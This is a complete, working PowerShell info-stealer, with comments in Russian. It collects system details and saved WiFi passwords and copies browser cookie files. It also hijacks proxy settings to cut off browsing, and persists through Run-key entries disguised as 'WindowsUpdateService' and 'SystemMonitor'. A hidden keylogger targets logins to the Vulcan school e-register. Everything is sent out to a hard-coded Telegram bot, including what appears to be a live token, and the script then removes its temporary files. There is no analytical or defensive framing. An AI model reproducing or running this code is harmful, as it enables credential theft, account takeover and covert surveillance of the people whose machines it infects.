# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# УСИЛЕННАЯ СКРЫТАЯ БЛОКИРОВКА ПРОКСИ С АВТОЗАГРУЗКОЙ
$blockStatus = "Not blocked"

try {
    # 1. Основные настройки прокси
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:9999"
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyOverride -Value "<local>"
    
    # 2. Дублирующие настройки в Connections (скрытые)
    $proxyBytes = [byte[]](0x46,0x00,0x00,0x00,0x1C,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x31,0x32,0x37,0x2E,0x30,0x2E,0x30,0x2E,0x31,0x3A,0x39,0x39,0x39,0x39,0x00)
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections" -Name DefaultConnectionSettings -Value $proxyBytes
    
    # 3. Создаем скрипт восстановления блокировки
    $lockScript = @"
while(`$true) {
    try {
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1 -ErrorAction Stop
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "127.0.0.1:9999" -ErrorAction Stop
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyOverride -Value "<local>" -ErrorAction Stop
        
        `$proxyBytes = [byte[]](0x46,0x00,0x00,0x00,0x1C,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x1A,0x00,0x00,0x00,0x31,0x32,0x37,0x2E,0x30,0x2E,0x30,0x2E,0x31,0x3A,0x39,0x39,0x39,0x39,0x00)
        Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections" -Name DefaultConnectionSettings -Value `$proxyBytes -ErrorAction Stop
    } catch { }
    Start-Sleep 30
}
"@
    $lockScript | Out-File "$env:TEMP\proxy_guard.ps1" -Encoding ASCII
    
    # 4. Добавляем в автозагрузку через реестр
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $psCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\proxy_guard.ps1`""
    Set-ItemProperty -Path $startupPath -Name "WindowsUpdateService" -Value $psCommand -ErrorAction SilentlyContinue
    
    # 5. Запускаем фоновый процесс блокировки
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\proxy_guard.ps1`"" -WindowStyle Hidden
    
    # 6. Блокируем настройки в браузерах
    # Chrome
    New-ItemProperty -Path "HKCU:\Software\Google\Chrome" -Name "ProxyMode" -Value "fixed_servers" -Force -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKCU:\Software\Google\Chrome" -Name "ProxyServer" -Value "127.0.0.1:9999" -Force -ErrorAction SilentlyContinue
    
    # Edge
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Edge" -Name "ProxyMode" -Value "fixed_servers" -Force -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Edge" -Name "ProxyServer" -Value "127.0.0.1:9999" -Force -ErrorAction SilentlyContinue
    
    $blockStatus = "Advanced proxy block + autostart active"
    
} catch {
    $blockStatus = "Block failed: $($_.Exception.Message)"
}

# КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ДАННЫХ ВУЛКАН
$keyloggerScript = @"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Windows.Forms

`$vulcanUrls = @(
    "*vulcan*",
    "*uonetplus*", 
    "*dziennik*",
    "*edu.gdynia*",
    "*eszkola.opolskie.pl*"
)

`$capturedData = @()
`$currentWindow = ""
`$buffer = ""

function Send-ToTelegram {
    param(`$message)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
    } catch { }
}

while(`$true) {
    try {
        `$activeWindow = (Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending | Select-Object -First 1).MainWindowTitle
        
        # Проверяем активное окно на наличие ключевых слов Вулкан
        foreach(`$url in `$vulcanUrls) {
            if(`$activeWindow -like `$url) {
                if(`$currentWindow -ne `$activeWindow) {
                    `$currentWindow = `$activeWindow
                    Send-ToTelegram "🎯 USER STARTED VULCAN: `$activeWindow"
                    `$buffer = ""
                }
                break
            }
        }
        
        # Перехватываем нажатия клавиш
        for(`$i = 0; `$i -lt 255; `$i++) {
            `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
            if(`$keyState -eq -32767) {
                `$key = [System.Windows.Forms.Keys]`$i
                
                # Обрабатываем специальные клавиши
                switch(`$key) {
                    "Enter" { 
                        if(`$buffer -ne "") {
                            Send-ToTelegram "📝 VULCAN DATA: `$buffer"
                            `$capturedData += "`$buffer"
                            `$buffer = ""
                        }
                    }
                    "Space" { `$buffer += " " }
                    "Back" { 
                        if(`$buffer.Length -gt 0) { 
                            `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
                        }
                    }
                    "Tab" { `$buffer += "[TAB]" }
                    default {
                        if(`$key -ge 65 -and `$key -le 90) {
                            # Проверяем Shift/CapsLock
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -or [System.Windows.Forms.GetAsyncKeyState]161
                            `$isCaps = [System.Windows.Forms.Console]::CapsLock
                            
                            if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                                `$buffer += `$key.ToString()
                            } else {
                                `$buffer += `$key.ToString().ToLower()
                            }
                        } elseif(`$key -ge 48 -and `$key -le 57) {
                            # Цифры
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -or [System.Windows.Forms.GetAsyncKeyState]161
                            `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                            if(`$isShift) {
                                `$buffer += `$symbols[`$key - 48]
                            } else {
                                `$buffer += (`$key - 48).ToString()
                            }
                        }
                    }
                }
                
                # Ограничиваем размер буфера
                if(`$buffer.Length -gt 100) {
                    Send-ToTelegram "📝 VULCAN DATA (buffer full): `$buffer"
                    `$capturedData += "`$buffer"
                    `$buffer = ""
                }
            }
        }
    } catch { }
    Start-Sleep -Milliseconds 10
}
"@

# Сохраняем и запускаем кейлоггер
$keyloggerScript | Out-File "$env:TEMP\vulcan_logger.ps1" -Encoding ASCII
Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`"" -WindowStyle Hidden

# Добавляем кейлоггер в автозагрузку
$startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\vulcan_logger.ps1`""
Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Cookies - создаем ZIP архив для удобной загрузки
$cookies = @()
$temp = "$env:TEMP\Cookies_$(Get-Date -Format 'HHmmss')"
$zipPath = "$env:TEMP\Cookies_$env:USERNAME.zip"

New-Item -ItemType Directory -Path $temp -Force | Out-Null

# Копируем файлы cookies
$browsers = @(
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cookies"},
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"},
    @{Name="Firefox"; Path=(Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Filter "cookies.sqlite" -Recurse -ErrorAction 0 | Select-Object -First 1).FullName}
)

foreach ($browser in $browsers) {
    if ($browser.Path -and (Test-Path $browser.Path)) {
        $dest = "$temp\$($browser.Name)_Cookies$(if($browser.Name -eq 'Firefox'){'.sqlite'})"
        Copy-Item $browser.Path $dest -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $cookies += $dest
            # Создаем текстовую информацию о файле
            $fileInfo = Get-Item $dest
            "$($browser.Name) Cookies - Size: $([math]::Round($fileInfo.Length/1KB, 2)) KB - Modified: $($fileInfo.LastWriteTime)" | Out-File "$temp\$($browser.Name)_info.txt" -Encoding UTF8
            $cookies += "$temp\$($browser.Name)_info.txt"
        }
    }
}

# Создаем ZIP архив с cookies
try {
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$temp\*" -DestinationPath $zipPath -Force
        if (Test-Path $zipPath) {
            $cookies += $zipPath
        }
    }
} catch {}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== VULCAN BLOCK STATUS ===
$blockStatus

=== KEYLOGGER STATUS ===
✅ Active - Monitoring Vulcan sites for credentials

=== BROWSER COOKIES ===
Found cookies files: $($cookies.Count)
Files available for download as ZIP archive

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Отправка ZIP архива с cookies
if (Test-Path $zipPath) {
    try {
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
            chat_id = '5674514050'
            document = [System.IO.File]::OpenRead($zipPath)
            caption = "📁 COOKIES ARCHIVE - Download and extract to view cookies files"
        }
    } catch {
        # Если не удалось отправить ZIP, отправляем файлы по отдельности
        $cookies | Where-Object {Test-Path $_} | ForEach-Object {
            try {
                Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                    chat_id = '5674514050'
                    document = [System.IO.File]::OpenRead($_)
                    caption = "Cookies file: $(Split-Path $_ -Leaf)"
                }
            } catch {}
        }
    }
} else {
    # Отправка отдельных файлов если ZIP не создался
    $cookies | Where-Object {Test-Path $_} | ForEach-Object {
        try {
            Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendDocument" -Method Post -Form @{
                chat_id = '5674514050'
                document = [System.IO.File]::OpenRead($_)
                caption = "Cookies file: $(Split-Path $_ -Leaf)"
            }
        } catch {}
    }
}

# Очистка
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
